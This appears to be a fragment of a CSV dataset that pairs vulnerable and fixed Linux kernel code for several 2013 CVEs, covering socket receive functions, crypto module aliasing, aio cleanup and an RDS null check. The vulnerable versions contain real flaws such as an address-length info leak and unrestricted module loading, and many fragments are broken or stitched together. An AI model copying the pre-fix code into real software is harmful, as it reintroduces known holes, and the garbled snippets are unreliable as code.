 init_waitqueue_func_entry(&u->peer_wake, unix_dgram_peer_wake_relay);
 unix_insert_socket(unix_sockets_unbound(sk), sk);
out:
 if (sk == NULL)
 if (unix_peer(sk)) {
 struct sock *old_peer = unix_peer(sk);
 unix_peer(sk) = other;
 unix_dgram_peer_wake_disconnect_wakeup(sk, old_peer);

 unix_state_double_unlock(sk, other);

 if (other != old_peer)
 struct scm_cookie scm;
 int max_level;
 int data_len = 0;
 int sk_locked;

 wait_for_unix_gc();
	err = scm_send(sock, msg, &scm, false);
 goto out_free;
	}

	sk_locked = 0;
 unix_state_lock(other);
restart_locked:
	err = -EPERM;
 if (!unix_may_send(sk, other))
 goto out_unlock;

 if (unlikely(sock_flag(other, SOCK_DEAD))) {
 /*
		 *	Check with 1003.1g - what should
		 *	datagram error
 */
 unix_state_unlock(other);
 sock_put(other);

 if (!sk_locked)
 unix_state_lock(sk);

		err = 0;

 if (unix_peer(sk) == other) {
 unix_peer(sk) = NULL;
 unix_dgram_peer_wake_disconnect_wakeup(sk, other);

 unix_state_unlock(sk);

 unix_dgram_disconnected(sk, other);
 goto out_unlock;
	}

 if (unlikely(unix_peer(other) != sk && unix_recvq_full(other))) {
 if (timeo) {
			timeo = unix_wait_for_peer(other, timeo);

			err = sock_intr_errno(timeo);
 if (signal_pending(current))
 goto out_free;

 goto restart;
		}

 if (!sk_locked) {
 unix_state_unlock(other);
 unix_state_double_lock(sk, other);
		}

 if (unix_peer(sk) != other ||
 unix_dgram_peer_wake_me(sk, other)) {
			err = -EAGAIN;
			sk_locked = 1;
 goto out_unlock;
		}

 if (!sk_locked) {
			sk_locked = 1;
 goto restart_locked;
		}
	}

 if (unlikely(sk_locked))
 unix_state_unlock(sk);

 if (sock_flag(other, SOCK_RCVTSTAMP))
 __net_timestamp(skb);
 maybe_add_creds(skb, sock, other);
 return len;

out_unlock:
 if (sk_locked)
 unix_state_unlock(sk);
 unix_state_unlock(other);
out_free:
 kfree_skb(skb);
 return mask;

	writable = unix_writable(sk);
 if (writable) {
 unix_state_lock(sk);

		other = unix_peer(sk);
 if (other && unix_peer(other) != sk &&
 unix_recvq_full(other) &&
 unix_dgram_peer_wake_me(sk, other))
			writable = 0;

 unix_state_unlock(sk);
	}

 if (writable)
"
2015,DoS Exec Code ,CVE-2013-7445,,
2015,,CVE-2013-7421,"
MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm (ASM)"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""aes"");
MODULE_ALIAS(""aes-asm"");
MODULE_AUTHOR(""David McCullough <ucdevel@gmail.com>"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm (ARM)"");
MODULE_ALIAS(""sha1"");
MODULE_AUTHOR(""David McCullough <ucdevel@gmail.com>"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm, NEON accelerated"");
MODULE_ALIAS(""sha1"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA512 Secure Hash Algorithm, NEON accelerated"");

MODULE_ALIAS(""sha512"");
MODULE_ALIAS(""sha384"");
MODULE_DESCRIPTION(""Synchronous AES in CCM mode using ARMv8 Crypto Extensions"");
MODULE_AUTHOR(""Ard Biesheuvel <ard.biesheuvel@linaro.org>"");
MODULE_LICENSE(""GPL v2"");
MODULE_ALIAS(""ccm(aes)"");
#define aes_xts_encrypt		neon_aes_xts_encrypt
#define aes_xts_decrypt		neon_aes_xts_decrypt
MODULE_DESCRIPTION(""AES-ECB/CBC/CTR/XTS using ARMv8 NEON"");
MODULE_ALIAS(""ecb(aes)"");
MODULE_ALIAS(""cbc(aes)"");
MODULE_ALIAS(""ctr(aes)"");
MODULE_ALIAS(""xts(aes)"");
#endif

MODULE_AUTHOR(""Ard Biesheuvel <ard.biesheuvel@linaro.org>"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm"");

MODULE_ALIAS(""sha1-powerpc"");
module_init(aes_s390_init);
module_exit(aes_s390_fini);

MODULE_ALIAS(""aes-all"");

MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm"");
MODULE_LICENSE(""GPL"");
module_init(des_s390_init);
module_exit(des_s390_exit);

MODULE_ALIAS(""des"");
MODULE_ALIAS(""des3_ede"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""DES & Triple DES EDE Cipher Algorithms"");
module_init(ghash_mod_init);
module_exit(ghash_mod_exit);

MODULE_ALIAS(""ghash"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""GHASH Message Digest Algorithm, s390 implementation"");
module_init(sha1_s390_init);
module_exit(sha1_s390_fini);

MODULE_ALIAS(""sha1"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm"");
module_init(sha256_s390_init);
module_exit(sha256_s390_fini);

MODULE_ALIAS(""sha256"");
MODULE_ALIAS(""sha224"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA256 and SHA224 Secure Hash Algorithm"");
	}
};

MODULE_ALIAS(""sha512"");

static int sha384_init(struct shash_desc *desc)
{
	}
};

MODULE_ALIAS(""sha384"");

static int __init init(void)
{
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""AES Secure Hash Algorithm, sparc64 aes opcode accelerated"");

MODULE_ALIAS(""aes"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Camellia Cipher Algorithm, sparc64 camellia opcode accelerated"");

MODULE_ALIAS(""aes"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CRC32c (Castagnoli), sparc64 crc32c opcode accelerated"");

MODULE_ALIAS(""crc32c"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""DES & Triple DES EDE Cipher Algorithms, sparc64 des opcode accelerated"");

MODULE_ALIAS(""des"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""MD5 Secure Hash Algorithm, sparc64 md5 opcode accelerated"");

MODULE_ALIAS(""md5"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm, sparc64 sha1 opcode accelerated"");

MODULE_ALIAS(""sha1"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA-224 and SHA-256 Secure Hash Algorithm, sparc64 sha256 opcode accelerated"");

MODULE_ALIAS(""sha224"");
MODULE_ALIAS(""sha256"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA-384 and SHA-512 Secure Hash Algorithm, sparc64 sha512 opcode accelerated"");

MODULE_ALIAS(""sha384"");
MODULE_ALIAS(""sha512"");

#include ""crop_devid.c""

MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm, asm optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""aes"");
MODULE_ALIAS(""aes-asm"");

MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm, Intel AES-NI instructions optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""aes"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Blowfish Cipher Algorithm, asm optimized"");
MODULE_ALIAS(""blowfish"");
MODULE_ALIAS(""blowfish-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Camellia Cipher Algorithm, AES-NI/AVX2 optimized"");
MODULE_ALIAS(""camellia"");
MODULE_ALIAS(""camellia-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Camellia Cipher Algorithm, AES-NI/AVX optimized"");
MODULE_ALIAS(""camellia"");
MODULE_ALIAS(""camellia-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Camellia Cipher Algorithm, asm optimized"");
MODULE_ALIAS(""camellia"");
MODULE_ALIAS(""camellia-asm"");

MODULE_DESCRIPTION(""Cast5 Cipher Algorithm, AVX optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""cast5"");

MODULE_DESCRIPTION(""Cast6 Cipher Algorithm, AVX optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""cast6"");
MODULE_AUTHOR(""Alexander Boyko <alexander_boyko@xyratex.com>"");
MODULE_LICENSE(""GPL"");

MODULE_ALIAS(""crc32"");
MODULE_ALIAS(""crc32-pclmul"");
MODULE_DESCRIPTION(""CRC32c (Castagnoli) optimization using Intel Hardware."");
MODULE_LICENSE(""GPL"");

MODULE_ALIAS(""crc32c"");
MODULE_ALIAS(""crc32c-intel"");
MODULE_DESCRIPTION(""T10 DIF CRC calculation accelerated with PCLMULQDQ."");
MODULE_LICENSE(""GPL"");

MODULE_ALIAS(""crct10dif"");
MODULE_ALIAS(""crct10dif-pclmul"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Triple DES EDE Cipher Algorithm, asm optimized"");
MODULE_ALIAS(""des3_ede"");
MODULE_ALIAS(""des3_ede-asm"");
MODULE_ALIAS(""des"");
MODULE_ALIAS(""des-asm"");
MODULE_AUTHOR(""Jussi Kivilinna <jussi.kivilinna@iki.fi>"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""GHASH Message Digest Algorithm, ""
 ""acclerated by PCLMULQDQ-NI"");
MODULE_ALIAS(""ghash"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION (""Salsa20 stream cipher algorithm (optimized assembly version)"");
MODULE_ALIAS(""salsa20"");
MODULE_ALIAS(""salsa20-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Serpent Cipher Algorithm, AVX2 optimized"");
MODULE_ALIAS(""serpent"");
MODULE_ALIAS(""serpent-asm"");

MODULE_DESCRIPTION(""Serpent Cipher Algorithm, AVX optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""serpent"");

MODULE_DESCRIPTION(""Serpent Cipher Algorithm, SSE2 optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""serpent"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm, Supplemental SSE3 accelerated"");

MODULE_ALIAS(""sha1"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA256 Secure Hash Algorithm, Supplemental SSE3 accelerated"");

MODULE_ALIAS(""sha256"");
MODULE_ALIAS(""sha224"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA512 Secure Hash Algorithm, Supplemental SSE3 accelerated"");

MODULE_ALIAS(""sha512"");
MODULE_ALIAS(""sha384"");

MODULE_DESCRIPTION(""Twofish Cipher Algorithm, AVX optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""twofish"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION (""Twofish Cipher Algorithm, asm optimized"");
MODULE_ALIAS(""twofish"");
MODULE_ALIAS(""twofish-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Twofish Cipher Algorithm, 3-way parallel asm optimized"");
MODULE_ALIAS(""twofish"");
MODULE_ALIAS(""twofish-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""842 Compression Algorithm"");


MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm"");
MODULE_LICENSE(""Dual BSD/GPL"");
MODULE_ALIAS(""aes"");
MODULE_PARM_DESC(dbg, ""Boolean to enable debugging (0/1 == off/on)"");
module_init(prng_mod_init);
module_exit(prng_mod_fini);
MODULE_ALIAS(""stdrng"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Anubis Cryptographic Algorithm"");


	alg = crypto_alg_lookup(name, type, mask);
 if (!alg) {
 request_module(""%s"", name);

 if (!((type ^ CRYPTO_ALG_NEED_FALLBACK) & mask &
		      CRYPTO_ALG_NEED_FALLBACK))
 request_module(""%s-all"", name);

		alg = crypto_alg_lookup(name, type, mask);
	}
","
MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm (ASM)"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_CRYPTO(""aes"");
MODULE_ALIAS_CRYPTO(""aes-asm"");
MODULE_AUTHOR(""David McCullough <ucdevel@gmail.com>"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm (ARM)"");
MODULE_ALIAS_CRYPTO(""sha1"");
MODULE_AUTHOR(""David McCullough <ucdevel@gmail.com>"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm, NEON accelerated"");
MODULE_ALIAS_CRYPTO(""sha1"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA512 Secure Hash Algorithm, NEON accelerated"");

MODULE_ALIAS_CRYPTO(""sha512"");
MODULE_ALIAS_CRYPTO(""sha384"");
MODULE_DESCRIPTION(""Synchronous AES in CCM mode using ARMv8 Crypto Extensions"");
MODULE_AUTHOR(""Ard Biesheuvel <ard.biesheuvel@linaro.org>"");
MODULE_LICENSE(""GPL v2"");
MODULE_ALIAS_CRYPTO(""ccm(aes)"");
#define aes_xts_encrypt		neon_aes_xts_encrypt
#define aes_xts_decrypt		neon_aes_xts_decrypt
MODULE_DESCRIPTION(""AES-ECB/CBC/CTR/XTS using ARMv8 NEON"");
MODULE_ALIAS_CRYPTO(""ecb(aes)"");
MODULE_ALIAS_CRYPTO(""cbc(aes)"");
MODULE_ALIAS_CRYPTO(""ctr(aes)"");
MODULE_ALIAS_CRYPTO(""xts(aes)"");
#endif

MODULE_AUTHOR(""Ard Biesheuvel <ard.biesheuvel@linaro.org>"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm"");

MODULE_ALIAS_CRYPTO(""sha1-powerpc"");
module_init(aes_s390_init);
module_exit(aes_s390_fini);

MODULE_ALIAS_CRYPTO(""aes-all"");

MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm"");
MODULE_LICENSE(""GPL"");
module_init(des_s390_init);
module_exit(des_s390_exit);

MODULE_ALIAS_CRYPTO(""des"");
MODULE_ALIAS_CRYPTO(""des3_ede"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""DES & Triple DES EDE Cipher Algorithms"");
module_init(ghash_mod_init);
module_exit(ghash_mod_exit);

MODULE_ALIAS_CRYPTO(""ghash"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""GHASH Message Digest Algorithm, s390 implementation"");
module_init(sha1_s390_init);
module_exit(sha1_s390_fini);

MODULE_ALIAS_CRYPTO(""sha1"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm"");
module_init(sha256_s390_init);
module_exit(sha256_s390_fini);

MODULE_ALIAS_CRYPTO(""sha256"");
MODULE_ALIAS_CRYPTO(""sha224"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA256 and SHA224 Secure Hash Algorithm"");
	}
};

MODULE_ALIAS_CRYPTO(""sha512"");

static int sha384_init(struct shash_desc *desc)
{
	}
};

MODULE_ALIAS_CRYPTO(""sha384"");

static int __init init(void)
{
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""AES Secure Hash Algorithm, sparc64 aes opcode accelerated"");

MODULE_ALIAS_CRYPTO(""aes"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Camellia Cipher Algorithm, sparc64 camellia opcode accelerated"");

MODULE_ALIAS_CRYPTO(""aes"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CRC32c (Castagnoli), sparc64 crc32c opcode accelerated"");

MODULE_ALIAS_CRYPTO(""crc32c"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""DES & Triple DES EDE Cipher Algorithms, sparc64 des opcode accelerated"");

MODULE_ALIAS_CRYPTO(""des"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""MD5 Secure Hash Algorithm, sparc64 md5 opcode accelerated"");

MODULE_ALIAS_CRYPTO(""md5"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm, sparc64 sha1 opcode accelerated"");

MODULE_ALIAS_CRYPTO(""sha1"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA-224 and SHA-256 Secure Hash Algorithm, sparc64 sha256 opcode accelerated"");

MODULE_ALIAS_CRYPTO(""sha224"");
MODULE_ALIAS_CRYPTO(""sha256"");

#include ""crop_devid.c""
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA-384 and SHA-512 Secure Hash Algorithm, sparc64 sha512 opcode accelerated"");

MODULE_ALIAS_CRYPTO(""sha384"");
MODULE_ALIAS_CRYPTO(""sha512"");

#include ""crop_devid.c""

MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm, asm optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_CRYPTO(""aes"");
MODULE_ALIAS_CRYPTO(""aes-asm"");

MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm, Intel AES-NI instructions optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_CRYPTO(""aes"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Blowfish Cipher Algorithm, asm optimized"");
MODULE_ALIAS_CRYPTO(""blowfish"");
MODULE_ALIAS_CRYPTO(""blowfish-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Camellia Cipher Algorithm, AES-NI/AVX2 optimized"");
MODULE_ALIAS_CRYPTO(""camellia"");
MODULE_ALIAS_CRYPTO(""camellia-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Camellia Cipher Algorithm, AES-NI/AVX optimized"");
MODULE_ALIAS_CRYPTO(""camellia"");
MODULE_ALIAS_CRYPTO(""camellia-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Camellia Cipher Algorithm, asm optimized"");
MODULE_ALIAS_CRYPTO(""camellia"");
MODULE_ALIAS_CRYPTO(""camellia-asm"");

MODULE_DESCRIPTION(""Cast5 Cipher Algorithm, AVX optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_CRYPTO(""cast5"");

MODULE_DESCRIPTION(""Cast6 Cipher Algorithm, AVX optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_CRYPTO(""cast6"");
MODULE_AUTHOR(""Alexander Boyko <alexander_boyko@xyratex.com>"");
MODULE_LICENSE(""GPL"");

MODULE_ALIAS_CRYPTO(""crc32"");
MODULE_ALIAS_CRYPTO(""crc32-pclmul"");
MODULE_DESCRIPTION(""CRC32c (Castagnoli) optimization using Intel Hardware."");
MODULE_LICENSE(""GPL"");

MODULE_ALIAS_CRYPTO(""crc32c"");
MODULE_ALIAS_CRYPTO(""crc32c-intel"");
MODULE_DESCRIPTION(""T10 DIF CRC calculation accelerated with PCLMULQDQ."");
MODULE_LICENSE(""GPL"");

MODULE_ALIAS_CRYPTO(""crct10dif"");
MODULE_ALIAS_CRYPTO(""crct10dif-pclmul"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Triple DES EDE Cipher Algorithm, asm optimized"");
MODULE_ALIAS_CRYPTO(""des3_ede"");
MODULE_ALIAS_CRYPTO(""des3_ede-asm"");
MODULE_ALIAS_CRYPTO(""des"");
MODULE_ALIAS_CRYPTO(""des-asm"");
MODULE_AUTHOR(""Jussi Kivilinna <jussi.kivilinna@iki.fi>"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""GHASH Message Digest Algorithm, ""
 ""acclerated by PCLMULQDQ-NI"");
MODULE_ALIAS_CRYPTO(""ghash"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION (""Salsa20 stream cipher algorithm (optimized assembly version)"");
MODULE_ALIAS_CRYPTO(""salsa20"");
MODULE_ALIAS_CRYPTO(""salsa20-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Serpent Cipher Algorithm, AVX2 optimized"");
MODULE_ALIAS_CRYPTO(""serpent"");
MODULE_ALIAS_CRYPTO(""serpent-asm"");

MODULE_DESCRIPTION(""Serpent Cipher Algorithm, AVX optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_CRYPTO(""serpent"");

MODULE_DESCRIPTION(""Serpent Cipher Algorithm, SSE2 optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_CRYPTO(""serpent"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA1 Secure Hash Algorithm, Supplemental SSE3 accelerated"");

MODULE_ALIAS_CRYPTO(""sha1"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA256 Secure Hash Algorithm, Supplemental SSE3 accelerated"");

MODULE_ALIAS_CRYPTO(""sha256"");
MODULE_ALIAS_CRYPTO(""sha224"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""SHA512 Secure Hash Algorithm, Supplemental SSE3 accelerated"");

MODULE_ALIAS_CRYPTO(""sha512"");
MODULE_ALIAS_CRYPTO(""sha384"");

MODULE_DESCRIPTION(""Twofish Cipher Algorithm, AVX optimized"");
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_CRYPTO(""twofish"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION (""Twofish Cipher Algorithm, asm optimized"");
MODULE_ALIAS_CRYPTO(""twofish"");
MODULE_ALIAS_CRYPTO(""twofish-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Twofish Cipher Algorithm, 3-way parallel asm optimized"");
MODULE_ALIAS_CRYPTO(""twofish"");
MODULE_ALIAS_CRYPTO(""twofish-asm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""842 Compression Algorithm"");
MODULE_ALIAS_CRYPTO(""842"");

MODULE_DESCRIPTION(""Rijndael (AES) Cipher Algorithm"");
MODULE_LICENSE(""Dual BSD/GPL"");
MODULE_ALIAS_CRYPTO(""aes"");
MODULE_PARM_DESC(dbg, ""Boolean to enable debugging (0/1 == off/on)"");
module_init(prng_mod_init);
module_exit(prng_mod_fini);
MODULE_ALIAS_CRYPTO(""stdrng"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Anubis Cryptographic Algorithm"");
MODULE_ALIAS_CRYPTO(""anubis"");

	alg = crypto_alg_lookup(name, type, mask);
 if (!alg) {
 request_module(""crypto-%s"", name);

 if (!((type ^ CRYPTO_ALG_NEED_FALLBACK) & mask &
		      CRYPTO_ALG_NEED_FALLBACK))
 request_module(""crypto-%s-all"", name);

		alg = crypto_alg_lookup(name, type, mask);
	}
"
2014,DoS ,CVE-2013-7348,"err_cleanup:
 aio_nr_sub(ctx->max_reqs);
err:
 aio_free_ring(ctx);
 free_percpu(ctx->cpu);
 free_percpu(ctx->reqs.pcpu_count);
 free_percpu(ctx->users.pcpu_count);
","err_cleanup:
 aio_nr_sub(ctx->max_reqs);
err:

 free_percpu(ctx->cpu);
 free_percpu(ctx->reqs.pcpu_count);
 free_percpu(ctx->users.pcpu_count);
"
2014,DoS ,CVE-2013-7339,"	ret = rdma_bind_addr(cm_id, (struct sockaddr *)&sin);
 /* due to this, we will claim to support iWARP devices unless we
	   check node_type. */
 if (ret || cm_id->device->node_type != RDMA_NODE_IB_CA)

		ret = -EADDRNOTAVAIL;

 rdsdebug(""addr %pI4 ret %d node type %d\n"",
","	ret = rdma_bind_addr(cm_id, (struct sockaddr *)&sin);
 /* due to this, we will claim to support iWARP devices unless we
	   check node_type. */
 if (ret || !cm_id->device ||
	    cm_id->device->node_type != RDMA_NODE_IB_CA)
		ret = -EADDRNOTAVAIL;

 rdsdebug(""addr %pI4 ret %d node type %d\n"",
"
2014,#NAME?,CVE-2013-7281," if (saddr) {
		saddr->family = AF_IEEE802154;
		saddr->addr = mac_cb(skb)->sa;
	}
 if (addr_len)
		*addr_len = sizeof(*saddr);


 if (flags & MSG_TRUNC)
		copied = skb->len;
{
 struct inet_sock *isk = inet_sk(sk);
 int family = sk->sk_family;
 struct sockaddr_in *sin;
 struct sockaddr_in6 *sin6;
 struct sk_buff *skb;
 int copied, err;

 if (flags & MSG_OOB)
 goto out;

 if (addr_len) {
 if (family == AF_INET)
			*addr_len = sizeof(*sin);
 else if (family == AF_INET6 && addr_len)
			*addr_len = sizeof(*sin6);
	}

 if (flags & MSG_ERRQUEUE) {
 if (family == AF_INET) {
 return ip_recv_error(sk, msg, len);

 /* Copy the address and add cmsg data. */
 if (family == AF_INET) {
 sin = (struct sockaddr_in *) msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));


 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
	} else if (family == AF_INET6) {
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6hdr *ip6 = ipv6_hdr(skb);
		sin6 = (struct sockaddr_in6 *) msg->msg_name;


		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;

		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);


 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
 if (flags & MSG_OOB)
 goto out;

 if (addr_len)
		*addr_len = sizeof(*sin);

 if (flags & MSG_ERRQUEUE) {
		err = ip_recv_error(sk, msg, len);
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 int is_udplite = IS_UDPLITE(sk);
 bool slow;

 /*
	 *	Check any passed addresses
 */
 if (addr_len)
		*addr_len = sizeof(*sin);

 if (flags & MSG_ERRQUEUE)
 return ip_recv_error(sk, msg, len);

 sin->sin_port = udp_hdr(skb)->source;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

 if (addr_len)
		*addr_len=sizeof(*sin6);

 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

		sin6->sin6_flowinfo = 0;
		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);

	}

 sock_recv_ts_and_drops(msg, sk, skb);
 int is_udp4;
 bool slow;

 if (addr_len)
		*addr_len = sizeof(struct sockaddr_in6);

 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		}

	}
 if (is_udp4) {
 if (inet->cmsg_flags)
 if (flags & MSG_OOB)
 goto out;

 if (addr_len)
		*addr_len = sizeof(*sin);

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb)
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
			MSG_CMSG_COMPAT))
 goto out_nofree;

 if (addr_len)
		*addr_len = sizeof(sa);

	skb = skb_recv_datagram(sk, flags, noblock, &rval);
 if (skb == NULL)
 goto out_nofree;

	rval = (flags & MSG_TRUNC) ? skb->len : copylen;

 if (msg->msg_name != NULL)
 memcpy(msg->msg_name, &sa, sizeof(struct sockaddr_pn));



out:
 skb_free_datagram(sk, skb);
"," if (saddr) {
		saddr->family = AF_IEEE802154;
		saddr->addr = mac_cb(skb)->sa;


		*addr_len = sizeof(*saddr);
	}

 if (flags & MSG_TRUNC)
		copied = skb->len;
{
 struct inet_sock *isk = inet_sk(sk);
 int family = sk->sk_family;


 struct sk_buff *skb;
 int copied, err;

 if (flags & MSG_OOB)
 goto out;








 if (flags & MSG_ERRQUEUE) {
 if (family == AF_INET) {
 return ip_recv_error(sk, msg, len);

 /* Copy the address and add cmsg data. */
 if (family == AF_INET) {
 struct sockaddr_in *sin = (struct sockaddr_in *)msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);

 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
	} else if (family == AF_INET6) {
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6hdr *ip6 = ipv6_hdr(skb);
 struct sockaddr_in6 *sin6 =
			(struct sockaddr_in6 *)msg->msg_name;

		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;

		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

